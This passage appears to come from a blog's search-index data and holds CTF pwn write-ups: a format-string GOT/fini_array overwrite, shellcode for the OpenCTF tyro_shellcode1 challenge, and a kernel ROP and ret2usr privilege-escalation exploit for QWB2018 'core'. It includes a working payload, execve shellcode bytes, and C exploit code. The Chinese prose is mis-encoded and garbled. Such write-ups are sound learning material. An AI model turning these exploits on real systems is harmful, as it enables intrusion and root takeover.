·å¯ä»¥getshellã€‚\n\nâ–²åŠ«æŒä¸ºsystemå‡½æ•°ï¼Œè¦æ±‚åŸå‡½æ•°çš„å‚æ•°ä¹Ÿåº”è¯¥æ˜¯ä¸€ä¸ªåœ°å€æ‰è¡Œï¼Œä¸ç„¶æ— æ³•è·³è½¬ã€‚\n\n7.ç¡®å®šæ”»å‡»æ€è·¯åï¼Œå¼€å§‹è®¡ç®—åç§»ï¼Œå…ˆç”¨IDAç®€å•è¿œç¨‹è°ƒè¯•ï¼Œè¾“å…¥AAAAï¼Œç„¶åå°†ç¨‹åºä¸€ç›´è¿è¡Œè‡³printfå¤„ï¼Œå¯ä»¥çœ‹åˆ°æ ˆä¸­çš„åç§»ä¸º12.5å¤„ä¼šå‡ºç°Açš„asciiå€¼ï¼Œä¹Ÿå°±æ˜¯41ã€‚ç”±äºæˆ‘ä»¬éœ€è¦æ ˆä¸­å®Œæ•´çš„å¯¹åº”åœ°å€ï¼Œæ‰€ä»¥éœ€è¦è¾“å…¥aaå¡«å……ä¸¤ä¸ªå­—èŠ‚ï¼Œæ¥ä½¿å¾—åç§»é‡ä»12.5åˆ°13å¤„ï¼Œä»è€Œèƒ½å¤Ÿå®Œæ•´åœ°è¾“å…¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„åœ°å€ã€‚\n\n8.ä¹‹åç¼–å†™payloadï¼Œè¿™é‡Œä½¿ç”¨æ§åˆ¶å­—ç¬¦%hn(ä¸€æ¬¡æ”¹åŠ¨ä¸¤ä¸ªå­—èŠ‚)æ¥ä¿®æ”¹ï¼š\n\npayload = â€˜aaâ€™+p32(fini_array_addr+2) + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + str(æ ¼å¼åŒ–fini+2) + str(æ ¼å¼åŒ–fini) + str(æ ¼å¼åŒ–strlen_got+2) + str(æ ¼å¼åŒ–strlen_got)\n\n9.ä¹‹åè¿˜å¾—ç¡®å®šè¾“å‡ºçš„å€¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfini_array = 0x08049934\nstart_addr = 0x080484f0\nstrlen_got = 0x08049a54\nsystem_plt = 0x08048490\n```\n\næŸ¥çœ‹ä»£ç ï¼Œç”±äºsprintfçš„ä½œç”¨ï¼Œprintfçš„å‚æ•°sä¿å­˜çš„ä¸æ­¢æœ‰æˆ‘ä»¬è¾“å…¥çš„ï¼Œè¿˜æœ‰Nice to meet you,è®¡ç®—åŠ ä¸Šaaå¯å¾—æ€»å…±æœ‰8f-7c+1=0x14ä¸ªï¼Œå†åŠ ä¸Šä¸‰ä¸ª32ä½çš„åœ°å€12å­—èŠ‚ï¼Œæ€»å…±32å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯0x20ã€‚(è®¡ç®—æˆªè‡³ä¸º str(æ ¼å¼åŒ–fini+2)å¤„)\n\n10.å¦å¤–ç”±äº.fini_arrayçš„å†…å®¹ä¸º0x080485a0(æŒ‰då¯æŸ¥çœ‹æ•°æ®)ï¼Œè€Œæˆ‘ä»¬éœ€è¦æ›´æ”¹çš„startåœ°å€ä¸º0x080484f0ï¼Œæ‰€ä»¥åªéœ€è¦æ”¹åŠ¨å¤§ç«¯åºåˆ—ä¸­çš„85a0å˜æˆ84f0å³å¯ã€‚æ‰€ä»¥æ ¼å¼åŒ–.finiä¸­éœ€è¦å†è¾“å‡ºçš„å­—èŠ‚æ•°åº”è¯¥æ˜¯0x84f0-0x20=0x84D0=34000ã€‚è€Œ0x08049934+2å¤„çš„å†…å®¹æœ¬èº«å°±æ˜¯0804ï¼Œä¸éœ€è¦ä¿®æ”¹ã€‚æ‰€ä»¥åªéœ€è¦ä¿®æ”¹.fini_array_addrå¯¹åº”çš„å†…å®¹å³å¯ï¼Œ(.fini_array+2å¯¹åº”çš„å†…å®¹æœ¬èº«å°±æ˜¯0804ï¼Œä¸ç”¨ä¿®æ”¹)ã€‚æ‰€ä»¥payloadå¯ä»¥åˆ å»p32(fini_array_addr+2)å’Œstr(æ ¼å¼åŒ–fini+2)ã€‚\n\n11.æ¥ç€è®¡ç®—ï¼Œéœ€è¦å°†strlen_got+2å¤„çš„å€¼æ”¹æˆ0804ï¼Œç”±äºä¹‹å‰å·²ç»è¾“å‡ºäº†0x84f0æ‰€ä»¥éœ€è¦ç”¨åˆ°æ•°æ®æˆªæ–­ã€‚ä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å†…å®¹ä¸­éœ€è¦å†è¾“å‡ºçš„å­—èŠ‚æ•°ä¸º0x10804-0x84f0=0x8314=33556ã€‚\n\nç„¶åå†è®¡ç®—strlen_gotçš„å€¼ï¼Œéœ€è¦å†è¾“å‡º0x18490-0x10804=0x7c8c=31884ã€‚\n\næ•…éƒ½è®¡ç®—å®Œæ¯•ï¼Œæœ€åpayloadä¸ºï¼š\n\npayload = â€˜aaâ€™ + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + â€™%34000c%12$hnâ€™ + â€˜%33556c%13$hnâ€™ + â€˜%31884c%14$hnâ€™\n\n12.payloadä¹‹åï¼Œè¿è¡Œå®Œç¬¬ä¸€æ¬¡çš„printfä¹‹åï¼Œç¨‹åºä¼šå›åˆ°startï¼Œä¹‹åéœ€è¦å†è¾“å…¥å­—ç¬¦ä¸²io.sendline('/bin/sh\\x00')æ¥å®Œæ•´è¿è¡Œsystemï¼Œä»è€Œgetshellã€‚\n","tags":["Fmstr"],"categories":["PWN","Fmstr0x6"]},{"title":"Openctf 2016-tyro_shellcode1","url":"/2021/08/14/Openctf 2016-tyro_shellcode1/","content":"\n \n\n1.å¸¸è§„checksecï¼Œå¼€äº†Canaryå’ŒNXï¼ŒIDAæŸ¥æ‰¾æ¼æ´ï¼Œæ‰¾åˆ°ä¸‹åˆ—å¥‡æ€ªä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nv4 = mmap(0, 0x80u, 7, 34, -1, 0);\n-----------------------------------------------------------------------------\nread(0, v4, 0x20u);\nv5 = ((int (*)(void))v4)();\n```\n\nå¯ä»¥çŒœå‡ºæ¥æ˜¯è¾“å…¥åˆ°v4ä¸­ï¼Œç„¶åv4è¢«å¼ºåˆ¶è½¬æ¢æˆå‡½æ•°æŒ‡é’ˆè¢«è°ƒç”¨ã€‚æŸ¥çœ‹æ±‡ç¼–ä»£ç ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191554098.jpeg)\n\nè¿™é‡Œå°±æ²¡åŠæ³•åˆ¤æ–­åˆ°åº•[esp+34h]æ˜¯ä¸æ˜¯v4äº†ï¼Œå› ä¸ºv4æ˜¯é€šè¿‡mmapç”³è¯·çš„ä¸€å—å†…å­˜ï¼Œè™½ç„¶åœ¨æ ˆä¸Šï¼Œä½†æ˜¯å¹¶ä¸çŸ¥é“åœ¨å“ªï¼Œéœ€è¦é€šè¿‡è°ƒè¯•æ‰èƒ½çŸ¥é“ï¼Œè°ƒè¯•ä¹‹åå‘ç°ç¡®å®æ˜¯è¿™æ ·ã€‚\n\n2.è™½ç„¶æœ€å¼€å§‹checksecç¨‹åºï¼Œå‘ç°å¼€äº†NXï¼Œé‚£ä¹ˆè¿™ä¸å°±ä»£è¡¨æ²¡åŠæ³•shellcodeäº†å—ã€‚è°ƒè¯•ä¹Ÿå‘ç°ï¼Œé™¤äº†ä»£ç æ®µï¼Œå…¶å®ƒæ®µéƒ½æ²¡æœ‰Xå±æ€§ï¼Œéƒ½ä¸å¯æ‰§è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹æ±‡ç¼–ä»£ç ï¼Œæ˜¯call eaxï¼Œè°ƒç”¨çš„æ˜¯å¯„å­˜å™¨ï¼Œä¸æ˜¯ç¨‹åºæ®µï¼Œä¸€å®šå¯ä»¥è¢«è°ƒç”¨çš„ï¼Œç„¶åeaxä¸­ä¿å­˜çš„å†…å®¹å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å•Šï¼Œæ‰€ä»¥ç›´æ¥è¾“å…¥shellcodeå°±å®Œäº‹ï¼Œè¿æ ˆæº¢å‡ºä»€ä¹ˆçš„éƒ½ä¸ç”¨è€ƒè™‘ã€‚\n\n3.é‚£ä¹ˆç›´æ¥ä»http://shell-storm.org/shellcode/\n\næŸ¥æ‰¾è·å–å°±å¯ä»¥ã€‚ç»™å‡ºä¸€æ®µå¯ç”¨shellcode:\n\n\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\n\n \n\nç”±äºè¿™æ®µshellcodeè°ƒç”¨çš„æ˜¯int80æ¥è·å–shellçš„ï¼Œæ‰€ä»¥ç»™å‡ºä¸‹åˆ—ä»‹ç»\n\nâ–²int 80hï¼š128å·ä¸­æ–­\n\n1.åœ¨32ä½Linuxä¸­è¯¥ä¸­æ–­è¢«ç”¨äºå‘¼å«ç³»ç»Ÿè°ƒç”¨ç¨‹åºsystem_call()ã€‚\n\n2.read(), write(), system()ä¹‹ç±»çš„éœ€è¦å†…æ ¸â€œå¸®å¿™â€çš„å‡½æ•°ï¼Œå°±æ˜¯å›´ç»•è¿™æ¡æŒ‡ä»¤åŠ ä¸Šä¸€äº›é¢å¤–å‚æ•°å¤„ç†ï¼Œå¼‚å¸¸å¤„ç†ç­‰ä»£ç å°è£…è€Œæˆçš„ã€‚32ä½linuxç³»ç»Ÿçš„å†…æ ¸ä¸€å…±æä¾›äº†0~337å·å…±è®¡338ç§ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥å®ç°ä¸åŒçš„åŠŸèƒ½ã€‚\n\n3.è¾“å…¥çš„shellcodeä¹Ÿå°±æ±‡ç¼–æˆäº†EAX = 0Xb = 11ï¼ŒEBX = &(â€œ/bin//shâ€), ECX = EDX = 0ï¼Œç­‰åŒäºæ‰§è¡Œä»£ç sys_execve(\"/bin//sh\", 0, 0, 0)ï¼Œé€šè¿‡/bin/shè½¯é“¾æ¥æ‰“å¼€ä¸€ä¸ªshellã€‚è¿™é‡Œsys_execveè°ƒç”¨çš„å‚æ•°å°±æ˜¯ebxçš„å¯¹åº”çš„åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ²¡æœ‰systemå‡½æ•°çš„æƒ…å†µä¸‹æ‰“å¼€shellã€‚64ä½linuxç³»ç»Ÿçš„æ±‡ç¼–æŒ‡ä»¤å°±æ˜¯syscallï¼Œè°ƒç”¨sys_execveéœ€è¦å°†EAXè®¾ç½®ä¸º0x3Bï¼Œæ”¾ç½®å‚æ•°çš„å¯„å­˜å™¨ä¹Ÿå’Œ32ä½ä¸åŒ\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["shellcode"],"categories":["PWN","Shellcode0x2"]},{"title":"QWB2018-core","url":"/2021/08/14/QWB2018-core/","content":"\nä¸€ã€ä½¿ç”¨Kernel_ROP\n\n1.é¦–å…ˆè§£åŒ…ï¼ŒæŸ¥çœ‹initè®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#!/bin/sh\nmount -t proc proc /proc\nmount -t sysfs sysfs /sys\nmount -t devtmpfs none /dev\n/sbin/mdev -s\nmkdir -p /dev/pts\nmount -vt devpts -o gid=4,mode=620 none /dev/pts\nchmod 666 /dev/ptmx\ncat /proc/kallsyms > /tmp/kallsyms\necho 1 > /proc/sys/kernel/kptr_restrict\necho 1 > /proc/sys/kernel/dmesg_restrict\nifconfig eth0 up\nudhcpc -i eth0\nifconfig eth0 10.0.2.15 netmask 255.255.255.0\nroute add default gw 10.0.2.2\ninsmod /core.ko\n\npoweroff -d 120 -f &\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\necho 'sh end!\\n'\numount /proc\numount /sys\n\npoweroff -d 0 -f\n```\n\næ³¨æ„ä¸‰ä¸ªåœ°æ–¹ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\necho 1 > /proc/sys/kernel/kptr_restrict\ncat /proc/kallsyms > /tmp/kallsyms ------------------------------------------------------------ \ninsmod /core.ko \n------------------------------------------------------------- \nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n```\n\n(1)æŠŠ/proc/kallsysmæ‹·è´åˆ°tmpæ–‡ä»¶å¤¹ä¸‹ä¸€ä»½ï¼Œè€Œkallsysmä¸­ä¿å­˜äº†åŠ è½½å†…æ ¸ä¹‹åå‡ ä¹æ‰€æœ‰çš„å‡½æ•°è°ƒç”¨ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508732.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508526.jpeg)\n\nç”±äºè¢«kptr_restrictè®¾ä¸º 1ï¼Œè¿™æ ·å°±ä¸èƒ½é€šè¿‡ /proc/kallsymsæŸ¥çœ‹å‡½æ•°åœ°å€äº†ï¼Œä½†æ˜¯è¿™é‡ŒæŠŠkallsysmæ‹·è´åˆ°äº†tmpæ–‡ä»¶å¤¹ä¸‹ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä»tmpæ–‡ä»¶å¤¹ä¸‹çš„kallsysmæ‰¾åˆ°æ‰€æœ‰éœ€è¦çš„åœ°å€ï¼ŒåŒ…æ‹¬gadgetã€‚\n\n(2)insmod /core.koï¼ŒæŒ‚è½½äº†ç›®å½•ä¸‹çš„core.koé©±åŠ¨ç¨‹åºï¼Œé€šå¸¸è¿™ä¸ªé©±åŠ¨ç¨‹åºå°±æ˜¯æ¼æ´çš„æ‰€åœ¨ç‚¹ï¼Œç”¨IDAæ‰“å¼€åˆ†æã€‚\n\n(3)setsid /bin/cttyhack setuidgid 1000 /bin/shï¼Œè¿™ä¸ªå°±æ˜¯è®¾ç½®ç”¨æˆ·æƒé™äº†ï¼Œ1000ä¸ºæƒé™IDï¼Œå¦‚æœè®¾ç½®ä¸º0å°±æ˜¯rootæƒé™äº†ï¼Œä¸ºäº†è°ƒè¯•ï¼Œå¯ä»¥å…ˆè®¾ç½®æˆ0æ–¹ä¾¿ç‚¹ã€‚\n\n2.å†çœ‹ä¸‹start.shå¯åŠ¨qemuçš„è®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nqemu-system-x86_64 \\\n-m 64M \\\n-kernel ./bzImage \\\n-initrd ./core.cpio \\\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\" \\\n-s \\\n-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\\n-nographic \\\n```\n\nå¯ä»¥çœ‹åˆ°åŠ è½½äº†core.koé©±åŠ¨ï¼Œå¹¶ä¸”å¼€å¯äº†kaslrã€‚\n\n3.ç„¶ååˆ†æä¸‹core.koä»£ç ï¼Œæ¼æ´ç‚¹åœ¨core_copy_funcå‡½æ•°å’Œcore_writeå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#core_writeå‡½æ•°ï¼š\nif ( v3 <= 0x800 && !copy_from_user(&name, a2, v3) )\n\n\n#core_copy_funcå‡½æ•°ï¼š\n__int64 v2; // [rsp+0h] [rbp-50h]\n-------------------------------------------------------\nif ( a1 > 63 )\n{\n   printk(&unk_2A1);\n   result = 0xFFFFFFFFLL;\n}\nelse\n{\n    qmemcpy(&v2, &name, (unsigned __int16)a1);\n}\n```\n\n(1)nameæ˜¯å…¨å±€å˜é‡ï¼Œcore_writeå‡½æ•°ä»ç”¨æˆ·ç©ºé—´æ‹·è´äº†v3é•¿åº¦åˆ°nameä¸­ï¼Œè€Œcore_writeå‡½æ•°å¯ä»¥é€šè¿‡expä¸­è°ƒç”¨writeï¼Œwrite(core_fd, data, 0x800);æ‰“å¼€è¯¥é©±åŠ¨ä»è€Œè°ƒç”¨é©±åŠ¨ä¸­çš„core_writeå‡½æ•°ï¼Œå°†æˆ‘ä»¬çš„dataå†™å…¥åˆ°nameä¸­ã€‚\n\n(2)ä¹‹åç”±äºcore_copy_funcå‡½æ•°å¯ä»¥é€šè¿‡ioctlå‡½æ•°ç›´æ¥ä¼ å‚è°ƒç”¨ï¼Œæ‰€ä»¥å…¶ä¸­çš„a1å—åˆ°æˆ‘ä»¬æ§åˆ¶ï¼Œç„¶åå¯¹a1çš„æ£€æŸ¥åˆåªæœ‰ä¸€ä¸ªif(a1>63)ï¼Œå­˜åœ¨æ•´æ•°è½¬æ¢çš„æ¼æ´ï¼Œä¹Ÿå°±æ˜¯å¦‚æœa1ä¸ºè´Ÿæ•°ï¼Œå°±èƒ½å¤Ÿé€šè¿‡ifè¯­å¥ï¼Œé‚£ä¹ˆé€šè¿‡qmemcpy(&v2, &name, (unsigned __int16)a1);å‡½æ•°çš„éšå½¢è½¬æ¢ï¼Œå°±å¯ä»¥ä»nameæ‹·è´å¾ˆå¤§çš„æ•°æ®åˆ°v2ä¸Šï¼Œè€Œv2åœ¨å†…æ ¸æ ˆä¸Šï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¹å†…æ ¸æ ˆè¿›è¡Œæ ˆæº¢å‡ºã€‚\n\n4.å¯ä»¥æ„é€ ropé“¾å°è¯•äº†ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªcanaryï¼ŒLeakæ¼æ´åœ¨core_readå’Œioctlå‡½æ•°ä¸Šï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#core_readå‡½æ•°ï¼š\n__int64 v5;\n--------------------------------------------------------\nresult = copy_to_user(v1, (char *)&v5 + off, 64LL);\n\n#ioctlå‡½æ•°ï¼š\ncase 0x6677889C:\n    printk(&unk_2CD);\n    off = v3;\n    break;\n```\n\noffæ˜¯å…¨å±€å˜é‡ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ioctlå‡½æ•°æ¥è®¾ç½®ã€‚v5æ˜¯core_readå†…æ ¸å‡½æ•°æ ˆä¸Šçš„å˜é‡ï¼Œå¯ä»¥ä½¿å¾—offé€‚å½“å¤§ä¸€äº›ï¼Œä»è€Œæ³„éœ²å‡ºcanaryã€‚\n\n5.ç°åœ¨å°è¯•æ„é€ expï¼š\n\n(1)é¦–å…ˆæ‰¾åœ°å€ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n//æ‰¾åˆ°å†…æ ¸åŠ è½½åŸºåœ°å€vmlinux_baseå’Œprepare_kernel_credå‡½æ•°ã€commit_credså‡½æ•°åœ°å€\nsize_t find_symbols()\n{\n    FILE* kallsyms_fd = fopen(\"/tmp/kallsyms\", \"r\");\n    if(kallsyms_fd < 0)\n    {\n        puts(\"[*]open kallsyms error!\");\n        exit(0);\n    }\n\n    char buf[0x30] = {0};\n    while(fgets(buf, 0x30, kallsyms_fd))\n    {\n        if(commit_creds & prepare_kernel_cred)\n            return 0;\n\n        if(strstr(buf, \"commit_creds\") && !commit_creds)\n        {\n            /* puts(buf); */\n            char hex[20] = {0};\n            strncpy(hex, buf, 16);\n            /* printf(\"hex: %s\\n\", hex); */\n            sscanf(hex, \"%llx\", &commit_creds);\n            printf(\"commit_creds addr: %p\\n\", commit_creds);\n            vmlinux_base = commit_creds - 0x9c8e0;\n            printf(\"vmlinux_base addr: %p\\n\", vmlinux_base);\n            \n        }\n\n        if(strstr(buf, \"prepare_kernel_cred\") && !prepare_kernel_cred)\n        {\n            /* puts(buf); */\n            char hex[20] = {0};\n            strncpy(hex, buf, 16);\n            sscanf(hex, \"%llx\", &prepare_kernel_cred);\n            printf(\"prepare_kernel_cred addr: %p\\n\", prepare_kernel_cred);\n            vmlinux_base = prepare_kernel_cred - 0x9cce0;\n            /* printf(\"vmlinux_base addr: %p\\n\", vmlinux_base); */\n        }\n    }\n\n    if(!(prepare_kernel_cred & commit_creds))\n    {\n        puts(\"[*]Error!\");\n        exit(0);\n    }\n}\n```\n\nè¿™é‡Œçš„0x9c8e0å’Œ0x9cce0éƒ½æ˜¯é€šè¿‡ROPgadgetæŸ¥æ‰¾vmlinuxæ‰¾å‡ºæ¥çš„ï¼Œä¸è¿‡æ‰¾åˆ°çš„åœ°å€æ˜¯ç›¸å¯¹åç§»åŠ ä¸Šäº†0xffffffff81000000ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦å‡å»å¾—åˆ°ç›¸å¯¹åç§»ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191508584.jpeg)\n\n(2)ç„¶åæ³„éœ²canary:\n\n```\n//æ³¨é‡Šå¤´\n\nvoid core_read(int fd, char *buf)\n{\n    puts(\"[*]read to buf.\");\n    ioctl(fd, 0x6677889B, buf);\n}\n----------------------------------------------------------------------\nvoid set_off(int fd, long long idx)\n{\n    printf(\"[*]set off to %ld\\n\", idx);\n    ioctl(fd, 0x6677889C, idx);\n}\n---------------------------------------------------------------------\nset_off(fd, 0x40);\n\nchar buf[0x40] = {0};\ncore_read(fd, buf);\nsize_t canary = ((size_t *)buf)[0];\nprintf(\"[+]canary: %p\\n\", canary);\n//è¿™é‡Œfdä¸ºint fd = open(\"/proc/core\", 2);\n```\n\n(3)æ„é€ ropé“¾ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nssize_t offset = vmlinux_base - 0xffffffff81000000;\nsize_t rop[0x1000] = {0};\nfor(int i = 0; i < 10; i++)\n{\n    rop[i] = canary;\n}\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n\nrop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret\nrop[i++] = 0;\n\nrop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;\n\nrop[i++] = (size_t)spawn_shell; // rip\n\nrop[i++] = user_cs; // cs\nrop[i++] = user_rflags; // rflags\nrop[i++] = user_sp; // rsp\nrop[i++] = user_ss;\n```\n\nè¿™é‡Œropé“¾æ„é€ ä¸€èˆ¬åˆ†ä¸º\n\nâ‘ è¦†ç›–è¿”å›åœ°å€ï¼Œæ‰§è¡Œcommit_creds(prepare_kernel_cred(0) )å‡½æ•°ï¼Œææƒï¼Œå³ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n```\n\nâ‘¡é€šè¿‡swapgså’Œiretqè¿”å›ç”¨æˆ·æ€ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nrop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret\nrop[i++] = 0;\n\nrop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;\n```\n\nâ–²è¿™é‡Œçš„swapgså’Œiretqæœ€å¥½ç”¨objdump -d vmlinux > gadgetæ¥ä¿å­˜å¯»æ‰¾ï¼Œå¦‚æœç”¨ROPgadgetæˆ–è€…ropperå¯èƒ½ä¸è¯†åˆ«ï¼Œä»è€Œæ— æ³•æ‰¾åˆ°ã€‚\n\nâ‘¢ç€é™†å¼€shellï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n\nvoid spawn_shell()\n{\n    if(!getuid())\n    {\n\tsystem(\"/bin/sh\");\n    }\n    else\n    {\n\tputs(\"[*]spawn shell error!\");\n    }\n    exit(0);\n}\n----------------------------------------------------\nrop[i++] = (size_t)spawn_shell; // rip\n\nrop[i++] = user_cs; // cs\nrop[i++] = user_rflags; // rflags\nrop[i++] = user_sp; // rsp\nrop[i++] = user_ss; // ss\n```\n\n(4)æœ€åè¾“å…¥ropé“¾ï¼Œææƒæ‰§è¡Œï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nvoid core_copy_func(int fd, long long size)\n{\n    printf(\"[*]copy from user with size: %ld\\n\", size);\n    ioctl(fd, 0x6677889A, size);\n}\n--------------------------------------------------------------\nwrite(fd, rop, 0x800);\ncore_copy_func(fd, 0xffffffffffff0000 | (0x100));\n```\n\nâ–²éœ€è¦æ³¨æ„çš„æ˜¯åœ¨ç¨‹åºè¿›å…¥å†…æ ¸æ€ä¹‹å‰éœ€è¦ä¿å­˜ä¸‹ç”¨æˆ·æ€çš„å‚æ•°ï¼Œä¸ç„¶ä¹‹åæ²¡åŠæ³•è¿”å›ç”¨æˆ·æ€å¼€shellï¼š\n\n```\nsize_t user_cs, user_ss, user_rflags, user_sp;\nvoid save_status()\n{\n    __asm__(\"mov user_cs, cs;\"\n        \"mov user_ss, ss;\"\n        \"mov user_sp, rsp;\"\n        \"pushf;\"\n        \"pop user_rflags;\"\n        );\n    puts(\"[*]status has been saved.\");\n}\n```\n\n \n\näºŒã€ä½¿ç”¨Ret2usræŠ€æœ¯ï¼š\n\n1.åœ¨è¿™é“é¢˜ä¸­ä¸ROPå·®ä¸å¤šï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºææƒçš„æ—¶å€™ï¼š\n\n(1)ROPæŠ€æœ¯ä¸­ï¼Œåˆ©ç”¨æ€æƒ³å’Œå¸¸è§„pwné¢˜ä¸€æ ·ï¼Œrdiä¼ å‚ä¹‹åå¯»æ‰¾Gadgetæ¥è°ƒç”¨commit_creds(prepare_kernel_cred(0))ã€‚\n\n(2)Ret2UsræŠ€æœ¯ä¸­ï¼Œç”±äºæˆ‘ä»¬æ˜¯ç›´æ¥è¿è¡Œæˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶expï¼Œæ‰€ä»¥åœ¨expæ–‡ä»¶å†…å£°æ˜å®šä¹‰çš„å‡½æ•°ä¼šè¢«åŠ è½½åˆ°expçš„è¿›ç¨‹ä¸­ï¼Œå¯ä»¥ç›´æ¥åœ¨expä¸­è°ƒç”¨ï¼Œä¸éœ€è¦ropã€‚ä½†æ˜¯è¿™é‡Œå¦‚æœç›´æ¥è°ƒç”¨system(\"/bin/sh\")æ²¡ä»€ä¹ˆç”¨ï¼Œæƒé™ä»ç„¶ä¸æ˜¯rootï¼Œè¿˜æ˜¯éœ€è¦è°ƒç”¨commit_creds(prepare_kernel_cred(0))ææƒæ‰è¡Œï¼Œæ‰€ä»¥è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨æ³„éœ²å‡ºæ¥çš„åœ°å€ç›´æ¥æ„é€ è¯¥å‡½æ•°è°ƒç”¨å³å¯ï¼Œè€Œä¸ç”¨å†ropæ¥è°ƒç”¨äº†ã€‚\n\nå°±ç›¸å½“äºå°†ä»¥ä¸‹ä»£ç æ›¿æ¢ä¸€ä¸‹ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret\nrop[i++] = 0;\nrop[i++] = prepare_kernel_cred; // prepare_kernel_cred(0)\n\nrop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret\nrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; ret\nrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx;\nrop[i++] = commit_creds;\n```\n\næ›¿æ¢æˆï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nrop[i++] = (size_t)get_root;\n------------------------------------------------\n//å‡½æ•°å®šä¹‰ä¸ºï¼š\nvoid get_root()\n{\n    char* (*pkc)(int) = prepare_kernel_cred;\n    void (*cc)(char*) = commit_creds;\n    (*cc)((*pkc)(0));\n    /* puts(\"[*] root now.\"); */\n}\n```\n\næœ€å¼€å§‹æˆ‘æƒ³ä¸ºä»€ä¹ˆä¸ç›´æ¥è¿è¡Œè°ƒç”¨ï¼Œåé¢æ‰çŸ¥é“æ˜¯ç‰¹æƒæ¨¡å¼é—®é¢˜ã€‚å¦‚æœç›´æ¥è°ƒç”¨ï¼Œå°±ä¼šå‡ºç°è®¿é—®é”™è¯¯ï¼Œå› ä¸ºæˆ‘ä»¬æ„é€ çš„å‡½æ•°çš„å‡½æ•°åœ°å€æ˜¯åœ¨å†…æ ¸ç©ºé—´ä¸­ï¼Œè€Œç”¨æˆ·ç©ºé—´æ˜¯æ— æ³•è¿è¡Œå†…æ ¸ç©ºé—´çš„å‡½æ•°ã€‚æ‰€ä»¥éœ€è¦è°ƒç”¨write(fd, rop, 0x30 * 8);è¿›å…¥åˆ°å†…æ ¸ç©ºé—´ï¼Œè·å¾—ç‰¹æƒæ¨¡å¼ä¸‹ring0çš„æƒé™ï¼Œç„¶åè¿è¡Œç”¨æˆ·ç©ºé—´çš„get_root()å‡½æ•°ï¼Œå†è¿›å…¥åˆ°å†…æ ¸ç©ºé—´å¯»æ‰¾å¯¹äºçš„commit_credså‡½æ•°å’Œprepare_kernel_cred(0)ç»“æ„ä½“ï¼Œä»è€Œææƒã€‚\n\n \n\n \n\n \n\n \n\nå‚è€ƒèµ„æ–™:\n\nctfwiki\n\n \n\n \n\n \n\n \n\n \n","tags":["Kernelé¢˜"],"categories":["pwn-kernel","Kernel-ROP","Kernel-Ret2Usr"]},{"title":"PlaidCTF 2013 ropasaurusrex","url":"/2021/08/14/PlaidCTF 2013 